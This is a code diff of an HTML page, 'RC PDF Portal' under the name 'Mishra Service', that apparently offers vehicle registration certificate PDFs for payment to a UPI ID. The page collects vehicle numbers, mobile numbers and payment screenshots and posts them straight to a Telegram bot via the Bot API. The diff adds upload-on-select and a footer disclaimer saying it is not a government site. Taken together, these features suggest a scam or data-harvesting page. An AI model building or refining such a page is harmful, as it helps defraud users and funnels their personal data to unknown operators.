@@ -51,7 +51,7 @@ font-weight:bold;
 cursor:pointer;
 }
 
-/* IND STYLE INPUT */
+/* IND INPUT */
 .ind-box{
 display:flex;
 align-items:center;
@@ -92,6 +92,7 @@ from{transform:rotate(0deg);}
 to{transform:rotate(360deg);}
 }
 
+/* FOOTER */
 .footer{
 margin-top:20px;
 padding:12px;
@@ -104,6 +105,29 @@ background:linear-gradient(270deg,red,blue,green,purple,cyan);
 background-size:600% 600%;
 animation:bg 10s infinite alternate;
 border-radius:12px;
+}
+
+.footer-links{
+display:flex;
+justify-content:flex-start;
+gap:15px;
+margin-top:6px;
+font-size:14px;
+}
+
+.footer-links span{
+cursor:pointer;
+text-decoration:underline;
+}
+
+.popup{
+display:none;
+background:#000c;
+color:white;
+padding:12px;
+margin-top:8px;
+border-radius:10px;
+font-size:13px;
 }
 </style>
 </head>
@@ -136,14 +160,15 @@ border-radius:12px;
 <p>UPI ID: bestinsurance@upi</p>
 
 <input id="mobile" placeholder="Mobile Number">
-<input type="file" id="proof">
+
+<input type="file" id="proof" accept="image/*" onchange="autoUpload()">
 
 <button onclick="submitPay()">Submit</button>
 </div>
 
 <!-- PAGE 3 -->
 <div id="p3" class="hidden">
-<h3>Payment Successful</h3>
+<h3>✅ Payment Successful</h3>
 <p>RC PDF will be sent soon</p>
 </div>
 
@@ -151,6 +176,25 @@ border-radius:12px;
 
 <div class="footer">
 <p>© 2026 Mishra Service</p>
+
+<div class="footer-links">
+<span onclick="toggle('about')">About</span>
+<span onclick="toggle('disclaimer')">Disclaimer</span>
+<span onclick="toggle('contact')">Contact</span>
+</div>
+
+<div id="about" class="popup">
+RC PDF Portal provides vehicle related digital services and assistance.
+</div>
+
+<div id="disclaimer" class="popup">
+We are not a government website. Data provided by users voluntarily.
+</div>
+
+<div id="contact" class="popup">
+Email: br09insurance@gmail.com
+</div>
+
 </div>
 
 <script>
@@ -172,10 +216,16 @@ p1.classList.add("hidden");
 p2.classList.remove("hidden");
 }
 
+function autoUpload(){
+if(proof.files[0]) submitPay();
+}
+
 function submitPay(){
+if(mobile.value.length<10) return alert("Enter mobile number");
+
 let data=new FormData();
 data.append("chat_id",chatId);
-data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
+data.append("caption","🚗 Vehicle: "+vehicle.value+"\n📱 Mobile: "+mobile.value);
 data.append("photo",proof.files[0]);
 
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
@@ -185,6 +235,12 @@ body:data
 p2.classList.add("hidden");
 p3.classList.remove("hidden");
 });
+}
+
+function toggle(id){
+document.querySelectorAll('.popup').forEach(p=>p.style.display="none");
+let el=document.getElementById(id);
+el.style.display = el.style.display==="block" ? "none" : "block";
 }
 </script>
 
